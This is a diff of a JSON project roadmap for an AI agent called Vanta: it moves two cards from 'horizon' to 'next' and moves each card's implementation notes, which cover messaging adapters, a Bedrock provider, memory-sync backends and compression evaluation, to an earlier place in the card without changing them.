@@ -4989,7 +4989,7 @@
       "id": "INSTALL-PARITY",
       "track": "Harness",
       "title": "Setup/install UX parity",
-      "status": "horizon",
+      "status": "next",
       "size": "S",
       "summary": "Audit the setup wizard + install flow against best-in-class one-command installs (one-line bootstrap.sh already exists). Smooth first-run to first-value.",
       "done": "A new user goes from install to a working session in one command + one setup step.",
@@ -11604,10 +11604,10 @@
       "codex": "gpt-5.5",
       "lens": "infra",
       "updated": "2026-06-21",
+      "notes": "Pure BEDROCK_MODEL_MAP (5 friendly -> REAL <provider>.<model>:<ver> ids: claude-sonnet->anthropic.claude-3-5-sonnet-20241022-v2:0, claude-haiku/opus, llama-3->meta.llama3-1-70b-instruct-v1:0, titan-text->amazon.titan-text-premier-v1:0) + resolveBedrockModelId (friendly->mapped, dotted-id->passthrough, unknown->default) + zod BedrockConfigSchema{region,modelId} + resolveBedrockConfig (region AWS_REGION|VANTA_BEDROCK_REGION + model VANTA_BEDROCK_MODEL via map + creds presence: key pair OR AWS_PROFILE; incomplete = {ok:false,missing:[region|model|credentials]} no crash) + BEDROCK_CATALOG_ENTRY (typed against the REAL ProviderEntry incl required short/models so its drop-in for PROVIDER_CATALOG). SECURITY: creds reported by PRESENCE only — no secret value (asserted never in output); no credential literal (gitleaks-safe). NO AWS SDK dep added. Built+tested; wire = providers/index resolveProvider case bedrock constructs a BedrockProvider signing via AWS SigV4 @aws-sdk/client-bedrock-runtime — a REAL adapter NOT a baseURL swap (named, SDK = boundary). Incomplete = missing[].",
       "after": [
         "SETUP-PROVIDERS-BESPOKE"
-      ],
-      "notes": "Pure BEDROCK_MODEL_MAP (5 friendly -> REAL <provider>.<model>:<ver> ids: claude-sonnet->anthropic.claude-3-5-sonnet-20241022-v2:0, claude-haiku/opus, llama-3->meta.llama3-1-70b-instruct-v1:0, titan-text->amazon.titan-text-premier-v1:0) + resolveBedrockModelId (friendly->mapped, dotted-id->passthrough, unknown->default) + zod BedrockConfigSchema{region,modelId} + resolveBedrockConfig (region AWS_REGION|VANTA_BEDROCK_REGION + model VANTA_BEDROCK_MODEL via map + creds presence: key pair OR AWS_PROFILE; incomplete = {ok:false,missing:[region|model|credentials]} no crash) + BEDROCK_CATALOG_ENTRY (typed against the REAL ProviderEntry incl required short/models so its drop-in for PROVIDER_CATALOG). SECURITY: creds reported by PRESENCE only — no secret value (asserted never in output); no credential literal (gitleaks-safe). NO AWS SDK dep added. Built+tested; wire = providers/index resolveProvider case bedrock constructs a BedrockProvider signing via AWS SigV4 @aws-sdk/client-bedrock-runtime — a REAL adapter NOT a baseURL swap (named, SDK = boundary). Incomplete = missing[]."
+      ]
     },
     {
       "id": "MSG-ADAPTER-SLACK",
@@ -11641,10 +11641,10 @@
       "codex": "gpt-5.4",
       "lens": "reach",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable parseDiscordMessages (Discord message objects -> InboundMessage: channel_id->chatId, author.id->from, content->stripControl, isGroup; SKIPS author.bot===true ANTI-LOOP; non-array/garbage -> []) + buildDiscordSendBody ({content}, capped at Discords 2000-char limit) + parseDiscordAllowlist (VANTA_DISCORD_ALLOWLIST comma -> Set, empty -> allow-all) + discordEnabled (VANTA_DISCORD_TOKEN present) + stripControl (C0/C1/DEL, keeps \\n\\t). DiscordAdapter implements PlatformAdapter (connect/disconnect/poll/send) over injected {fetchJson,postJson} transport — poll catch -> [] never throws; splitForLimit on send (long replies -> multiple capped, no truncation loss). SECURITY: bot-message skip (anti-loop); token=SECRET read ONLY in httpTransport Authorization: Bot <token> header at the wire, NEVER a literal (gitleaks-safe); inbound text control-stripped. Contract reconciled: base InboundMessage has no platform/userId (off-limits) -> mapped to real chatId/from/text/id/isGroup. Built+tested; wires = registry MESSAGING_CATALOG discord entry flip implemented:true + resolve.ts resolvePlatform adds a discordEnabled branch returning new DiscordAdapter (named; channel id source like Mattermost; live REST/gateway = boundary). Not configured = disabled.",
       "after": [
         "SETUP-MESSAGING-PLATFORMS"
-      ],
-      "notes": "Pure/injectable parseDiscordMessages (Discord message objects -> InboundMessage: channel_id->chatId, author.id->from, content->stripControl, isGroup; SKIPS author.bot===true ANTI-LOOP; non-array/garbage -> []) + buildDiscordSendBody ({content}, capped at Discords 2000-char limit) + parseDiscordAllowlist (VANTA_DISCORD_ALLOWLIST comma -> Set, empty -> allow-all) + discordEnabled (VANTA_DISCORD_TOKEN present) + stripControl (C0/C1/DEL, keeps \\n\\t). DiscordAdapter implements PlatformAdapter (connect/disconnect/poll/send) over injected {fetchJson,postJson} transport — poll catch -> [] never throws; splitForLimit on send (long replies -> multiple capped, no truncation loss). SECURITY: bot-message skip (anti-loop); token=SECRET read ONLY in httpTransport Authorization: Bot <token> header at the wire, NEVER a literal (gitleaks-safe); inbound text control-stripped. Contract reconciled: base InboundMessage has no platform/userId (off-limits) -> mapped to real chatId/from/text/id/isGroup. Built+tested; wires = registry MESSAGING_CATALOG discord entry flip implemented:true + resolve.ts resolvePlatform adds a discordEnabled branch returning new DiscordAdapter (named; channel id source like Mattermost; live REST/gateway = boundary). Not configured = disabled."
+      ]
     },
     {
       "id": "MSG-ADAPTER-MATRIX",
@@ -11660,10 +11660,10 @@
       "codex": "gpt-5.4",
       "lens": "reach",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable parseMatrixEvents(json,selfUserId?) (m.room.message events -> InboundMessage: chatId=room_id, from=sender, text=stripControl(content.body), id=event_id, isGroup:true; SKIPS sender===selfUserId ANTI-LOOP + non-text msgtypes m.image/file; zod safeParse per element, garbage/non-array -> []) + buildMatrixSendContent ({msgtype:m.text,body} control-stripped) + parseMatrixAllowlist (VANTA_MATRIX_ALLOWLIST comma, empty -> all) + matrixEnabled (VANTA_MATRIX_HOMESERVER AND VANTA_MATRIX_TOKEN) + MatrixAdapter implements PlatformAdapter over injected {sync,sendEvent} (poll syncs+parses, markdown->plain + splitForLimit no truncation; poll/send NEVER throw). SECURITY: self-event skip anti-loop; token=SECRET read ONLY into the injected httpTransport Authorization: Bearer <token> at the wire, NEVER a literal (gitleaks-safe); inbound+outbound control-stripped. Mirrors Discord/Email. Built+tested; wires = registry MESSAGING_CATALOG matrix entry flip implemented:true + resolve.ts resolvePlatform branch (homeserver+token -> new MatrixAdapter, optional selfUserId from /whoami) (named, live client-server API = boundary). Not configured = disabled.",
       "after": [
         "SETUP-MESSAGING-PLATFORMS"
-      ],
-      "notes": "Pure/injectable parseMatrixEvents(json,selfUserId?) (m.room.message events -> InboundMessage: chatId=room_id, from=sender, text=stripControl(content.body), id=event_id, isGroup:true; SKIPS sender===selfUserId ANTI-LOOP + non-text msgtypes m.image/file; zod safeParse per element, garbage/non-array -> []) + buildMatrixSendContent ({msgtype:m.text,body} control-stripped) + parseMatrixAllowlist (VANTA_MATRIX_ALLOWLIST comma, empty -> all) + matrixEnabled (VANTA_MATRIX_HOMESERVER AND VANTA_MATRIX_TOKEN) + MatrixAdapter implements PlatformAdapter over injected {sync,sendEvent} (poll syncs+parses, markdown->plain + splitForLimit no truncation; poll/send NEVER throw). SECURITY: self-event skip anti-loop; token=SECRET read ONLY into the injected httpTransport Authorization: Bearer <token> at the wire, NEVER a literal (gitleaks-safe); inbound+outbound control-stripped. Mirrors Discord/Email. Built+tested; wires = registry MESSAGING_CATALOG matrix entry flip implemented:true + resolve.ts resolvePlatform branch (homeserver+token -> new MatrixAdapter, optional selfUserId from /whoami) (named, live client-server API = boundary). Not configured = disabled."
+      ]
     },
     {
       "id": "MSG-ADAPTER-EMAIL",
@@ -11679,10 +11679,10 @@
       "codex": "gpt-5.4",
       "lens": "reach",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable parseEmailMessage (raw {from,subject,body,messageId,date?} -> InboundMessage: chatId=from=sender, text=stripControl(stripQuotedReply(body)), id=messageId, isGroup:false) + stripQuotedReply (cuts at first On .. wrote: attribution + trims trailing leading-> quote block) + buildEmailReply (to=sender, subject=Re: <orig> SINGLE-prefix no Re:Re:, body verbatim) + parseEmailAllowlist (VANTA_EMAIL_ALLOWLIST comma -> lower Set, empty -> all) + emailEnabled (VANTA_EMAIL_IMAP_HOST AND VANTA_EMAIL_SMTP_HOST) + EmailAdapter implements PlatformAdapter over injected {fetchInbox,sendMail} (poll fetches+parses+allowlist-filters + learns each senders subject Map for the Re: reply WITHOUT touching base.ts; send builds+control-strips+sends; poll/send NEVER throw). SECURITY: quoted-reply history stripped so a FORGED reply chain is never echoed to the agent; inbound+outbound body control-stripped; IMAP/SMTP passwords=SECRET flow ONLY through the injected transport (imapSmtpTransport at the wire), NEVER a literal (gitleaks-safe). Most-distinct messaging adapter (IMAP/SMTP not a chat API). Built+tested; wires = registry MESSAGING_CATALOG email entry flip implemented:true + resolve.ts resolvePlatform emailEnabled branch (named, live IMAP/SMTP = boundary). Not configured = disabled.",
       "after": [
         "SETUP-MESSAGING-PLATFORMS"
-      ],
-      "notes": "Pure/injectable parseEmailMessage (raw {from,subject,body,messageId,date?} -> InboundMessage: chatId=from=sender, text=stripControl(stripQuotedReply(body)), id=messageId, isGroup:false) + stripQuotedReply (cuts at first On .. wrote: attribution + trims trailing leading-> quote block) + buildEmailReply (to=sender, subject=Re: <orig> SINGLE-prefix no Re:Re:, body verbatim) + parseEmailAllowlist (VANTA_EMAIL_ALLOWLIST comma -> lower Set, empty -> all) + emailEnabled (VANTA_EMAIL_IMAP_HOST AND VANTA_EMAIL_SMTP_HOST) + EmailAdapter implements PlatformAdapter over injected {fetchInbox,sendMail} (poll fetches+parses+allowlist-filters + learns each senders subject Map for the Re: reply WITHOUT touching base.ts; send builds+control-strips+sends; poll/send NEVER throw). SECURITY: quoted-reply history stripped so a FORGED reply chain is never echoed to the agent; inbound+outbound body control-stripped; IMAP/SMTP passwords=SECRET flow ONLY through the injected transport (imapSmtpTransport at the wire), NEVER a literal (gitleaks-safe). Most-distinct messaging adapter (IMAP/SMTP not a chat API). Built+tested; wires = registry MESSAGING_CATALOG email entry flip implemented:true + resolve.ts resolvePlatform emailEnabled branch (named, live IMAP/SMTP = boundary). Not configured = disabled."
+      ]
     },
     {
       "id": "MSG-ADAPTER-TEAMS",
@@ -11734,10 +11734,10 @@
       "codex": "gpt-5.4",
       "lens": "reach",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable parseGoogleChatEvents (MESSAGE events -> InboundMessage: chatId=message.space.name, from=message.sender.name, text=stripControl(message.text), id=message.name, isGroup:true; SKIPS sender.type===BOT ANTI-LOOP + non-MESSAGE types; tolerant garbage/non-array -> []) + buildGoogleChatSend ({text} control-stripped) + parseGoogleChatAllowlist (VANTA_GOOGLE_CHAT_ALLOWLIST comma, empty -> all; filters space OR sender) + googleChatEnabled (VANTA_GOOGLE_CHAT_TOKEN) + GoogleChatAdapter implements PlatformAdapter over injected {poll,postMessage} (markdown->plain + split 4000; poll/send NEVER throw). SECURITY: BOT-sender skip anti-loop; token=SECRET read ONLY into httpTransport Authorization: Bearer at the wire, NEVER a literal (gitleaks-safe); google OAuth reuse documented; inbound+outbound control-stripped. Mirrors Matrix/Discord. Built+tested; wires = registry MESSAGING_CATALOG googlechat flip implemented:true (RECONCILE its requiredEnv VANTA_GOOGLECHAT_SA -> VANTA_GOOGLE_CHAT_TOKEN to match this adapter) + resolve.ts branch (token -> new GoogleChatAdapter) (named, live API = boundary). Not configured = disabled.",
       "after": [
         "SETUP-MESSAGING-PLATFORMS"
-      ],
-      "notes": "Pure/injectable parseGoogleChatEvents (MESSAGE events -> InboundMessage: chatId=message.space.name, from=message.sender.name, text=stripControl(message.text), id=message.name, isGroup:true; SKIPS sender.type===BOT ANTI-LOOP + non-MESSAGE types; tolerant garbage/non-array -> []) + buildGoogleChatSend ({text} control-stripped) + parseGoogleChatAllowlist (VANTA_GOOGLE_CHAT_ALLOWLIST comma, empty -> all; filters space OR sender) + googleChatEnabled (VANTA_GOOGLE_CHAT_TOKEN) + GoogleChatAdapter implements PlatformAdapter over injected {poll,postMessage} (markdown->plain + split 4000; poll/send NEVER throw). SECURITY: BOT-sender skip anti-loop; token=SECRET read ONLY into httpTransport Authorization: Bearer at the wire, NEVER a literal (gitleaks-safe); google OAuth reuse documented; inbound+outbound control-stripped. Mirrors Matrix/Discord. Built+tested; wires = registry MESSAGING_CATALOG googlechat flip implemented:true (RECONCILE its requiredEnv VANTA_GOOGLECHAT_SA -> VANTA_GOOGLE_CHAT_TOKEN to match this adapter) + resolve.ts branch (token -> new GoogleChatAdapter) (named, live API = boundary). Not configured = disabled."
+      ]
     },
     {
       "id": "MSG-ADAPTER-IRC",
@@ -11789,10 +11789,10 @@
       "codex": "gpt-5.4",
       "lens": "reach",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable parseLineEvents (handles BOTH the {events:[..]} wrapper AND a bare array; type:message + message.type:text -> InboundMessage: chatId=source.groupId ?? source.userId, from=source.userId, text=stripControl(message.text), id=message.id, isGroup=source.type===group; SKIPS non-message events follow/join/postback + non-text sticker/image/audio; garbage -> []) + buildLinePushBody (chatId,text -> {to:chatId, messages:[{type:text,text}]} control-stripped, ~5000 cap) + parseLineAllowlist (VANTA_LINE_ALLOWLIST comma, empty -> all; keys userId|groupId) + lineEnabled (VANTA_LINE_TOKEN) + LineAdapter implements PlatformAdapter over injected {poll,push} (PUSH api keyed by chatId, simpler than the one-time replyToken which parse drops; markdown->plain + split; poll/send NEVER throw). SECURITY: token=SECRET read ONLY into httpTransport Authorization: Bearer at the wire, NEVER a literal (gitleaks-safe); control-stripped; anti-loop: LINE webhooks dont echo the bots own outbound so no self-skip on parse, a self userId filtered at the allowlist. Inbound is webhook-driven (not poll) — default poll returns [], the gateways webhook buffer supplies it live. Completes the messaging-adapter set (Discord/Email/Matrix/GoogleChat/LINE). Built+tested; wires = registry line entry flip implemented:true + resolve.ts branch (token -> new LineAdapter) (named, live Messaging API = boundary). Not configured = disabled.",
       "after": [
         "SETUP-MESSAGING-PLATFORMS"
-      ],
-      "notes": "Pure/injectable parseLineEvents (handles BOTH the {events:[..]} wrapper AND a bare array; type:message + message.type:text -> InboundMessage: chatId=source.groupId ?? source.userId, from=source.userId, text=stripControl(message.text), id=message.id, isGroup=source.type===group; SKIPS non-message events follow/join/postback + non-text sticker/image/audio; garbage -> []) + buildLinePushBody (chatId,text -> {to:chatId, messages:[{type:text,text}]} control-stripped, ~5000 cap) + parseLineAllowlist (VANTA_LINE_ALLOWLIST comma, empty -> all; keys userId|groupId) + lineEnabled (VANTA_LINE_TOKEN) + LineAdapter implements PlatformAdapter over injected {poll,push} (PUSH api keyed by chatId, simpler than the one-time replyToken which parse drops; markdown->plain + split; poll/send NEVER throw). SECURITY: token=SECRET read ONLY into httpTransport Authorization: Bearer at the wire, NEVER a literal (gitleaks-safe); control-stripped; anti-loop: LINE webhooks dont echo the bots own outbound so no self-skip on parse, a self userId filtered at the allowlist. Inbound is webhook-driven (not poll) — default poll returns [], the gateways webhook buffer supplies it live. Completes the messaging-adapter set (Discord/Email/Matrix/GoogleChat/LINE). Built+tested; wires = registry line entry flip implemented:true + resolve.ts branch (token -> new LineAdapter) (named, live Messaging API = boundary). Not configured = disabled."
+      ]
     },
     {
       "id": "MSG-ADAPTER-WHATSAPP",
@@ -12079,7 +12079,7 @@
       "id": "VANTA-SKILLS-HUB",
       "track": "Extensibility",
       "title": "Skills hub — discover/share skills + agentskills.io standard compat",
-      "status": "horizon",
+      "status": "next",
       "size": "M",
       "summary": "From a reference agent (skills_hub + agentskills.io open standard): beyond authoring skills locally, discover/import/share skills via a hub and stay compatible with the agentskills.io open format so Vanta skills interop with the wider ecosystem.",
       "done": "Vanta can import/export skills in the agentskills.io format and pull from a hub; a third-party skill loads without code changes.",
@@ -12833,10 +12833,10 @@
       "effort": "medium",
       "lens": "agent-loop",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable CompressEvalCase{id,text,question,expectedAnswer,dim json|log|text|winnow-prune} + buildControlTreatment (control=original, treatment=injected compress(text), tokensSavedRatio=(ctrl-treat)/ctrl clamped [0,1] so grow/no-op->0; tokens via estTokens) + computeCNG(tokensSavedRatio,qualityRetained) = saved×quality − penalty (penalty=1.5×saved×max(0,0.5−quality)): high-saved+high-quality -> high (0.5,1.0->0.5); high-saved+LOW-quality -> NEGATIVE (0.5,0.1->-0.25); zero-saved -> 0 regardless + runCompressEvalCase (judges the answer FROM the TREATMENT text via injected judge) + aggregateCompressEval ({meanCNG,meanTokensSaved,meanQuality,harmful: ids where cng<0}) + formatCompressEvalReport. HARMFUL COMPRESSION CAUGHT: a compressor stripping the answer-bearing line -> judge 0 quality from treatment -> cng<0 -> in harmful (tested good vs harmful). REPEATABLE: no Math.random/Date.now (same case+deps -> identical, asserted). Distinct from src/eval/compress-cng.ts (live pass@1) — this is per-fixture quality-judge CNG. Built+tested; wire = vanta eval compress <dim> loads fixtures + injects compressContent + an LLM judge -> runCompressEvalCase -> formatCompressEvalReport + .vanta artifact (named, mirrors mem-eval).",
       "after": [
         "SKILL-EVAL-CORPUS"
-      ],
-      "notes": "Pure/injectable CompressEvalCase{id,text,question,expectedAnswer,dim json|log|text|winnow-prune} + buildControlTreatment (control=original, treatment=injected compress(text), tokensSavedRatio=(ctrl-treat)/ctrl clamped [0,1] so grow/no-op->0; tokens via estTokens) + computeCNG(tokensSavedRatio,qualityRetained) = saved×quality − penalty (penalty=1.5×saved×max(0,0.5−quality)): high-saved+high-quality -> high (0.5,1.0->0.5); high-saved+LOW-quality -> NEGATIVE (0.5,0.1->-0.25); zero-saved -> 0 regardless + runCompressEvalCase (judges the answer FROM the TREATMENT text via injected judge) + aggregateCompressEval ({meanCNG,meanTokensSaved,meanQuality,harmful: ids where cng<0}) + formatCompressEvalReport. HARMFUL COMPRESSION CAUGHT: a compressor stripping the answer-bearing line -> judge 0 quality from treatment -> cng<0 -> in harmful (tested good vs harmful). REPEATABLE: no Math.random/Date.now (same case+deps -> identical, asserted). Distinct from src/eval/compress-cng.ts (live pass@1) — this is per-fixture quality-judge CNG. Built+tested; wire = vanta eval compress <dim> loads fixtures + injects compressContent + an LLM judge -> runCompressEvalCase -> formatCompressEvalReport + .vanta artifact (named, mirrors mem-eval)."
+      ]
     },
     {
       "id": "PRUNE-CONTEXT-WIRE",
@@ -12850,10 +12850,10 @@
       "effort": "medium",
       "lens": "agent-loop",
       "updated": "2026-06-21",
+      "notes": "LIVE WIRE (compress/apply.ts): pure/injectable pruneContextEnabled (VANTA_PRUNE_CONTEXT=1, default OFF) + pruneContextText (resolvePruneScorerKind(env,{logprobSource:false}) -> heuristic floor zero-config -> winnow pruneText at keepRatio 0.6; prune failure/inflating/same-length/empty -> ORIGINAL never throws) + a new exported pruneContext(text,env) seam in apply.ts a caller opts a chunk into. DEFAULT OFF = BYTE-IDENTICAL (asserted at BOTH layers: pruneContextText returns the exact input + never reaches the prune fn when off; pruneContext returns identical + tokensSaved:0); real-default ON test proves winnow pruneText actually shrinks tokens. Reuses PRUNE-SCORER-RESOLVE + WINNOW-LOGPROB-SCORER + winnow pruneText (no reimplementation). I re-verified the FULL suite myself (10187 green, tsc clean) since it edits a shared compress path. Non-kernel opt-in wire (safe to do at depth; the 2 kernel-approval-loop wires DELEGATED-AUTHORITY/CHANNEL-PERMISSIONS deferred to fresh attention per security discipline).",
       "after": [
         "WINNOW-LOGPROB-SCORER"
-      ],
-      "notes": "LIVE WIRE (compress/apply.ts): pure/injectable pruneContextEnabled (VANTA_PRUNE_CONTEXT=1, default OFF) + pruneContextText (resolvePruneScorerKind(env,{logprobSource:false}) -> heuristic floor zero-config -> winnow pruneText at keepRatio 0.6; prune failure/inflating/same-length/empty -> ORIGINAL never throws) + a new exported pruneContext(text,env) seam in apply.ts a caller opts a chunk into. DEFAULT OFF = BYTE-IDENTICAL (asserted at BOTH layers: pruneContextText returns the exact input + never reaches the prune fn when off; pruneContext returns identical + tokensSaved:0); real-default ON test proves winnow pruneText actually shrinks tokens. Reuses PRUNE-SCORER-RESOLVE + WINNOW-LOGPROB-SCORER + winnow pruneText (no reimplementation). I re-verified the FULL suite myself (10187 green, tsc clean) since it edits a shared compress path. Non-kernel opt-in wire (safe to do at depth; the 2 kernel-approval-loop wires DELEGATED-AUTHORITY/CHANNEL-PERMISSIONS deferred to fresh attention per security discipline)."
+      ]
     },
     {
       "id": "COMPRESSION-MEASURE",
@@ -12902,11 +12902,11 @@
       "effort": "low",
       "lens": "agent-loop",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable ScorerKind logprob|local|heuristic + ScorerAvailability{logprobSource?,localScorer?} (injected, never probed; heuristic NOT listed = unconditional floor) + resolvePruneScorerKind (logprob when logprobScorerEnabled(env) AND avail.logprobSource; else local when avail.localScorer; else heuristic; reuses logprobScorerEnabled read-only) + describePruneScorer + pruneScorerLadder (logprob>local>heuristic). NEVER picks an unavailable scorer (every returned kind backed by availability except heuristic = always present); resolver never returns empty. logprob enabled but no source -> NOT logprob; disabled via env even with a source -> not logprob; no config -> heuristic (winnow default, unchanged). Mirrors resolveVisionProvider aux-task ladder. NOTE: pruneText lives in the external winnow npm dep; heuristic floor = pruneText with no injected score. Built+tested; wire = pruneText calls resolvePruneScorerKind(env,{logprobSource,localScorer}) -> dispatch pruneByLogprob vs local vs heuristic (named).",
       "after": [
         "WINNOW-LOGPROB-SCORER",
         "WINNOW-LOCAL-SCORER"
-      ],
-      "notes": "Pure/injectable ScorerKind logprob|local|heuristic + ScorerAvailability{logprobSource?,localScorer?} (injected, never probed; heuristic NOT listed = unconditional floor) + resolvePruneScorerKind (logprob when logprobScorerEnabled(env) AND avail.logprobSource; else local when avail.localScorer; else heuristic; reuses logprobScorerEnabled read-only) + describePruneScorer + pruneScorerLadder (logprob>local>heuristic). NEVER picks an unavailable scorer (every returned kind backed by availability except heuristic = always present); resolver never returns empty. logprob enabled but no source -> NOT logprob; disabled via env even with a source -> not logprob; no config -> heuristic (winnow default, unchanged). Mirrors resolveVisionProvider aux-task ladder. NOTE: pruneText lives in the external winnow npm dep; heuristic floor = pruneText with no injected score. Built+tested; wire = pruneText calls resolvePruneScorerKind(env,{logprobSource,localScorer}) -> dispatch pruneByLogprob vs local vs heuristic (named)."
+      ]
     },
     {
       "id": "MEMORY-PROVIDER-FRAMEWORK",
@@ -12933,10 +12933,10 @@
       "effort": "medium",
       "lens": "memory",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable MemoryFile{name,hash,modifiedMs} + RemoteFile{name,hash?,modifiedMs} + buildMemorySyncPlan -> {toPush,toPull,conflicts,upToDate} (only-local->push, only-remote->pull, same-hash->upToDate, diff-hash local-newer->push / remote-newer->pull, diff-hash equal-mtime OR hashless-remote+equal-mtime->conflict) + formatSyncPlan (N push · M pull · K conflicts · J up-to-date) + MemoryAdapter port (list/push/pull) + runMemorySync (pushes toPush + pulls toPull via injected adapter, SKIPS conflicts NEVER auto-overwrites, per-file error recorded not thrown, never throws; failed listing -> empty remote -> push-all first-backup). SECURITY: memory may hold personal data -> adapter OPERATOR-INITIATED not automatic; a conflict is NEVER silently overwritten. Reuses existing google OAuth (no new auth). Built+tested; wires = a DriveMemoryAdapter (impl over tools/drive + googleFetch) + a vanta memory sync drive command call buildMemorySyncPlan + runMemorySync (named, live Drive = boundary).",
       "after": [
         "MEMORY-PROVIDER-FRAMEWORK"
-      ],
-      "notes": "Pure/injectable MemoryFile{name,hash,modifiedMs} + RemoteFile{name,hash?,modifiedMs} + buildMemorySyncPlan -> {toPush,toPull,conflicts,upToDate} (only-local->push, only-remote->pull, same-hash->upToDate, diff-hash local-newer->push / remote-newer->pull, diff-hash equal-mtime OR hashless-remote+equal-mtime->conflict) + formatSyncPlan (N push · M pull · K conflicts · J up-to-date) + MemoryAdapter port (list/push/pull) + runMemorySync (pushes toPush + pulls toPull via injected adapter, SKIPS conflicts NEVER auto-overwrites, per-file error recorded not thrown, never throws; failed listing -> empty remote -> push-all first-backup). SECURITY: memory may hold personal data -> adapter OPERATOR-INITIATED not automatic; a conflict is NEVER silently overwritten. Reuses existing google OAuth (no new auth). Built+tested; wires = a DriveMemoryAdapter (impl over tools/drive + googleFetch) + a vanta memory sync drive command call buildMemorySyncPlan + runMemorySync (named, live Drive = boundary)."
+      ]
     },
     {
       "id": "MEMORY-ADAPTER-MEM0",
@@ -12950,10 +12950,10 @@
       "effort": "medium",
       "lens": "memory",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable Mem0Memory{id,text,score?} + buildMem0AddBody (->{messages:[{role:user,content}],user_id}) + buildMem0SearchBody (->{query,user_id}) + parseMem0Memories (tolerant bare-array AND {results:[]}; per-row memory||text alias memory-wins, numeric id->string, score optional kept only when finite; non-array/garbage/text-less dropped -> []) + mem0Enabled (VANTA_MEM0_API_KEY present) + makeMem0Adapter({postJson,userId?}) -> {add(text)->{ok}, search(query)->Mem0Memory[]}; exports MEM0_ADD_PATH/MEM0_SEARCH_PATH. Found+fixed: zod z.number() REJECTS NaN but ACCEPTS Infinity -> Number.isFinite guard omits the unusable score keeps the memory (both asserted). SECURITY: key=secret, NEVER an adapter arg — lives only in the injected postJsons Authorization:Token header at the wire, never logged; external memory text control-stripped before a prompt. Errors-as-values: a postJson throw -> add {ok:false}/search [] (fall back to local), never throws. Proves the memory-as-a-service pattern over the drive-sync MemoryAdapter port. Built+tested; wire = memory/provider resolveMemoryProvider (existing MEMORY_CATALOG fork) guarded by mem0Enabled builds a real postJson (VANTA_MEM0_BASE_URL default api.mem0.ai) + routes remember/recall through makeMem0Adapter (named, live REST = boundary).",
       "after": [
         "MEMORY-PROVIDER-FRAMEWORK"
-      ],
-      "notes": "Pure/injectable Mem0Memory{id,text,score?} + buildMem0AddBody (->{messages:[{role:user,content}],user_id}) + buildMem0SearchBody (->{query,user_id}) + parseMem0Memories (tolerant bare-array AND {results:[]}; per-row memory||text alias memory-wins, numeric id->string, score optional kept only when finite; non-array/garbage/text-less dropped -> []) + mem0Enabled (VANTA_MEM0_API_KEY present) + makeMem0Adapter({postJson,userId?}) -> {add(text)->{ok}, search(query)->Mem0Memory[]}; exports MEM0_ADD_PATH/MEM0_SEARCH_PATH. Found+fixed: zod z.number() REJECTS NaN but ACCEPTS Infinity -> Number.isFinite guard omits the unusable score keeps the memory (both asserted). SECURITY: key=secret, NEVER an adapter arg — lives only in the injected postJsons Authorization:Token header at the wire, never logged; external memory text control-stripped before a prompt. Errors-as-values: a postJson throw -> add {ok:false}/search [] (fall back to local), never throws. Proves the memory-as-a-service pattern over the drive-sync MemoryAdapter port. Built+tested; wire = memory/provider resolveMemoryProvider (existing MEMORY_CATALOG fork) guarded by mem0Enabled builds a real postJson (VANTA_MEM0_BASE_URL default api.mem0.ai) + routes remember/recall through makeMem0Adapter (named, live REST = boundary)."
+      ]
     },
     {
       "id": "GATEWAY-SESSION-MANAGER",
@@ -12994,10 +12994,10 @@
       "effort": "medium",
       "lens": "infra",
       "updated": "2026-06-21",
+      "notes": "Pure MemoryBackendChoice{label,value,env?,needsKey?,note?} + MEMORY_BACKEND_CHOICES (local writes {} default · drive VANTA_MEMORY=drive reuses google OAuth note run vanta auth google · mem0 VANTA_MEMORY=mem0 needsKey · memanto VANTA_MEMORY=memanto + VANTA_MEMANTO_URL note local-first localhost:8000) + buildMemorySection (SettingSection header Memory backend, mem0 choice keyEnv=VANTA_MEM0_API_KEY drives the existing hidden secret prompt) + memoryChoiceEnv (local -> {}, never the secret key) + FEATURE_TOGGLE_CHOICES (proactive VANTA_PROACTIVE=1 · glimmer VANTA_GLIMMER=1 · tips VANTA_TIPS already on). ACCURACY CORRECTION: card said VANTA_MEMORY_PROVIDER/SYNC which DONT exist — the REAL selector is VANTA_MEMORY=<id> (resolveMemoryProvider reads env.VANTA_MEMORY); used the real var + cross-checked every feature env (VANTA_PROACTIVE/GLIMMER/TIPS confirmed in .env.example/policy/glimmer/startup-tips). mem0 key via secret-prompt NEVER a literal (gitleaks-safe, asserted absent from written env). Surfaces the drive/mem0/memanto adapters. Built+tested; wire = setup-full runFullSetup SETTINGS loop includes buildMemorySection (named, mirrors the execution-backend section). Local default = nothing written.",
       "after": [
         "MEMORY-PROVIDER-FRAMEWORK"
-      ],
-      "notes": "Pure MemoryBackendChoice{label,value,env?,needsKey?,note?} + MEMORY_BACKEND_CHOICES (local writes {} default · drive VANTA_MEMORY=drive reuses google OAuth note run vanta auth google · mem0 VANTA_MEMORY=mem0 needsKey · memanto VANTA_MEMORY=memanto + VANTA_MEMANTO_URL note local-first localhost:8000) + buildMemorySection (SettingSection header Memory backend, mem0 choice keyEnv=VANTA_MEM0_API_KEY drives the existing hidden secret prompt) + memoryChoiceEnv (local -> {}, never the secret key) + FEATURE_TOGGLE_CHOICES (proactive VANTA_PROACTIVE=1 · glimmer VANTA_GLIMMER=1 · tips VANTA_TIPS already on). ACCURACY CORRECTION: card said VANTA_MEMORY_PROVIDER/SYNC which DONT exist — the REAL selector is VANTA_MEMORY=<id> (resolveMemoryProvider reads env.VANTA_MEMORY); used the real var + cross-checked every feature env (VANTA_PROACTIVE/GLIMMER/TIPS confirmed in .env.example/policy/glimmer/startup-tips). mem0 key via secret-prompt NEVER a literal (gitleaks-safe, asserted absent from written env). Surfaces the drive/mem0/memanto adapters. Built+tested; wire = setup-full runFullSetup SETTINGS loop includes buildMemorySection (named, mirrors the execution-backend section). Local default = nothing written."
+      ]
     },
     {
       "id": "MEMORY-ADAPTER-MEMANTO",
@@ -13011,10 +13011,10 @@
       "effort": "medium",
       "lens": "memory",
       "updated": "2026-06-21",
